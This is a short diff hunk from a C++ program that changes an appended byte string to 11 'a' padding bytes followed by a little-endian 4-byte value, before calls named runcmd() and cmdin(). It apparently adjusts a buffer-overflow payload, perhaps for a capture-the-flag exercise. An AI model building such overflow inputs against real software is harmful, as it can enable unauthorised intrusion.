@@ -84,7 +84,7 @@ int main(){
 		}
 	}
 	
-	s += "\xed\x07\x00\x00";
+	s += string(11, 'a') + "\xed\x07\x00\x00";
 	
 	runcmd();
 	t = cmdin();
